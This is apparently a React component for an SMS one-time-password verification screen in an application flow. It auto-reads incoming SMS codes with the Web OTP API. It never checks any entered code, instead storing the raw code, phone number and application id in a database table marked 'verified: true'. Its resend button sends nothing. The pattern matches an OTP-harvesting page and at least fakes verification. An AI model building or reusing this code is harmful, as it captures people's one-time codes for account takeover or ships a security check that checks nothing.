import { useState, useRef, useEffect } from 'react';
import { supabase } from '../lib/supabase';

interface OTPVerificationProps {
  applicationId: string;
  phoneNumber: string;
  onNext: () => void;
}

export default function OTPVerification({ applicationId, phoneNumber, onNext }: OTPVerificationProps) {
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [countdown, setCountdown] = useState(107);
  const [error, setError] = useState<string>('');
  const otpRefs = [
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
    useRef<HTMLInputElement>(null),
  ];

  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  // Auto-fetch OTP from device incoming SMS (Web OTP API)
  useEffect(() => {
    if (!('OTPCredential' in window)) return;

    const abortController = new AbortController();
    let cancelled = false;

    const fetchOtp = async () => {
      try {
        const credential = await navigator.credentials.get({
          otp: { transport: ['sms'] },
          signal: abortController.signal,
        } as CredentialRequestOptions) as any;

        if (cancelled || !credential || !credential.code) return;

        const code = String(credential.code).replace(/\D/g, '').slice(0, 6);
        if (code.length === 6) {
          setOtp(code.split(''));
          otpRefs[5].current?.focus();
          // Auto-submit after the code is fed into the inputs
          setTimeout(() => submitOtp(code), 300);
        }
      } catch (err) {
        if ((err as any)?.name !== 'AbortError') {
          console.error('Web OTP fetch error:', err);
        }
      }
    };

    fetchOtp();

    return () => {
      cancelled = true;
      abortController.abort();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) value = value[0];
    if (!/^\d*$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (value && index < 5) {
      otpRefs[index + 1].current?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      otpRefs[index - 1].current?.focus();
    }
  };

  const submitOtp = async (otpCode: string) => {
    setError('');
    setLoading(true);

    try {
      const { error: dbError } = await supabase
        .from('otp_verifications')
        .insert({
          application_id: applicationId,
          phone_number: phoneNumber,
          otp_code: otpCode,
          verified: true,
        });

      if (dbError) {
        setError(dbError.message || 'OTP verification failed');
        console.error('Database error:', dbError);
        return;
      }

      onNext();
    } catch (err) {
      const errorMsg = err instanceof Error ? err.message : 'An error occurred';
      setError(errorMsg);
      console.error('Error submitting OTP:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    submitOtp(otp.join(''));
  };

  const handleResend = () => {
    setCountdown(107);
    setOtp(['', '', '', '', '', '']);
    otpRefs[0].current?.focus();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-950 via-blue-950 to-slate-950 relative overflow-hidden">
      <div className="absolute inset-0 pointer-events-none opacity-10">
        <svg className="w-full h-full" xmlns="http://www.w3.org/2000/svg">
          <defs>
            <pattern id="network" x="0" y="0" width="100" height="100" patternUnits="userSpaceOnUse">
              <circle cx="50" cy="50" r="2" fill="#06b6d4" />
              <line x1="50" y1="50" x2="80" y2="30" stroke="#06b6d4" strokeWidth="0.5" />
              <line x1="50" y1="50" x2="20" y2="70" stroke="#06b6d4" strokeWidth="0.5" />
              <line x1="50" y1="50" x2="60" y2="80" stroke="#06b6d4" strokeWidth="0.5" />
            </pattern>
          </defs>
          <rect width="100%" height="100%" fill="url(#network)" />
        </svg>
      </div>

      <div className="relative min-h-screen flex items-center justify-center p-4">
        <div className="w-full max-w-md">
          <div className="bg-slate-900/60 backdrop-blur-sm rounded-2xl shadow-xl p-8 border border-cyan-800/30">
            <h2 className="text-3xl font-bold text-center text-white mb-4">OTP Verification</h2>
            <p className="text-center text-slate-400 mb-2">Enter the OTP sent to your number</p>
            <p className="text-center text-cyan-300 font-semibold mb-8">{phoneNumber}</p>

            {'OTPCredential' in window ? (
              <div className="mb-6 p-3 bg-cyan-500/10 border border-cyan-500/30 rounded-lg flex items-center justify-center gap-2">
                <svg className="w-4 h-4 text-cyan-300 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <p className="text-cyan-300 text-sm">Waiting for SMS OTP auto-detect...</p>
              </div>
            ) : (
              <div className="mb-6 p-3 bg-amber-500/10 border border-amber-500/30 rounded-lg">
                <p className="text-amber-300 text-xs text-center">
                  Auto-detect isn't supported on this device. Enter the code manually below.
                </p>
              </div>
            )}

            {error && (
              <div className="mb-6 p-4 bg-red-500/10 border border-red-500/30 rounded-lg">
                <p className="text-red-300 text-sm">{error}</p>
              </div>
            )}

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="flex gap-2 justify-center">
                {otp.map((digit, index) => (
                  <input
                    key={index}
                    ref={otpRefs[index]}
                    type="text"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleOtpChange(index, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(index, e)}
                    className="w-12 h-14 text-center text-2xl font-bold border-2 border-cyan-800/50 rounded-lg bg-slate-800/50 text-white focus:ring-2 focus:ring-cyan-500 focus:border-cyan-500 outline-none transition"
                  />
                ))}
              </div>

              <button
                type="submit"
                disabled={loading || otp.some(d => !d)}
                className="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white font-semibold py-3 rounded-lg transition duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {loading ? 'Verifying...' : 'Submit'}
              </button>

              <div className="text-center space-y-2">
                <p className="text-slate-400">
                  Resend OTP in <span className="font-semibold text-cyan-300">{countdown}</span> seconds
                </p>
                <button
                  type="button"
                  onClick={handleResend}
                  disabled={countdown > 0}
                  className="w-full py-3 text-slate-300 font-semibold rounded-lg border border-slate-700 disabled:opacity-50 disabled:cursor-not-allowed hover:bg-slate-800/50 transition"
                >
                  Resend OTP
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}
